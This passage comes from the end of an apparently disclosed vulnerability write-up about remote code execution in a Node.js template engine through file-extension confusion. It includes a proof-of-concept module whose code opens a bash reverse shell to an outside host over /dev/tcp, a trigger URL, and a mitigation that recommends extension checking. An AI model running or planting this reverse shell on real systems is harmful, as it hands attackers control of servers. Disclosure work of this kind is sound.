+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">__express</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#34;id&#34;</span>).<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/pocas.kr/9999 0&gt;&amp;1&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>For the test, a module called pocas was created under node_modules.</p>
+<p><img src="https://media.discordapp.net/attachments/1049498153801502740/1054009708169662464/2022-12-18_21.18.07.png?width=1550&amp;height=977" alt=""></p>
+<ul>
+<li>http://localhost:3000/?filename=rce.pocas</li>
+</ul>
+<p>As shown above, you can see that RCE is triggered by calling an arbitrary library using the extension confusing.</p>
+<hr>
+<h1 id="mitigation">Mitigation<a href="#mitigation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The reason why the vulnerability occurs is that the file extension is parsed using the <code>path.extname()</code> function and the extension is not checked. Since the file extension is not checked, other arbitrary modules other than the ejs module can be called. So add file extension checking logic.</p>
+<p>:Recommendation: compare whether the extension obtained through <code>extname()</code> and the extension of the server’s default template are the same</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
